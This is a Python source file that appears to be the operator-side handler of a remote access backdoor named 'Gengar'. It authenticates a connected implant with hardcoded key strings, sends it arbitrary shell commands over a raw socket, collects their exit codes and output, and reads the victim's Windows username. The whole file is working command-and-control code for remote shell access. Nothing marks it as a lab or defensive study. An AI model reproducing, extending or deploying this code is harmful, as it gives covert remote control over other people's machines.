import datetime
import socket
import struct
import time
import uuid
from dataclasses import dataclass
from logging import log
from typing import final

from logger import logger


class CommandTypes:
    ECHO = 0
    SHELL = 1


INT_SIZE = 4


class GengarAuthenticationFailed(Exception):
    pass


@dataclass
class ShellOutput:
    exit_code: int
    output: str


AUTH_KEY_FROM_GENGAR = b'4be166c8-5aa2-4db2-90a1-446aacd14d32'
AUTH_KEY_TO_GENGAR = b'b6c077c1-12d1-4dbb-8786-d22a7090bfae'


@dataclass
class Gengar:
    _sock: socket.socket
    host: str
    spawn_time: datetime.datetime
    _authenticated: bool = False

    def init(self):
        self.username = self.shell('echo %username%').output.decode().strip()

    def echo(self, text: str):
        self._sock.send(struct.pack('I', CommandTypes.ECHO) + struct.pack('I', len(text)) + text.encode())
        output = self._sock.recv(len(text)).decode()
        return output

    def shell(self, cmd: str):
        output = b''
        self._sock.send(struct.pack('I', CommandTypes.SHELL) + struct.pack('I', len(cmd)) + cmd.encode())
        exit_code = struct.unpack('i', self._sock.recv(INT_SIZE))[0]
        if exit_code == -1:
            logger.error('Gengar failed to execute the shell command.')
            return
        while True:
            output_size = struct.unpack('I', self._sock.recv(INT_SIZE))[0]
            if not output_size:
                break
            output += self._sock.recv(output_size)
        return ShellOutput(exit_code, output)

    def auth(self):
        if self._authenticated:
            logger.info('Gengar already authenticated.')
            return

        try:
            self._sock.settimeout(5)
            received_auth_key = self._sock.recv(len(AUTH_KEY_FROM_GENGAR))
            if received_auth_key != AUTH_KEY_FROM_GENGAR:
                raise GengarAuthenticationFailed
            self._sock.send(AUTH_KEY_TO_GENGAR)
            self._authenticated = True
        except socket.timeout:
            raise GengarAuthenticationFailed
        finally:
            self._sock.settimeout(None)

    def uptime(self):
        return datetime.datetime.now() - self.spawn_time

    def __repr__(self) -> str:
        return f'Gengar @ {self.username} # {self.spawn_time}'
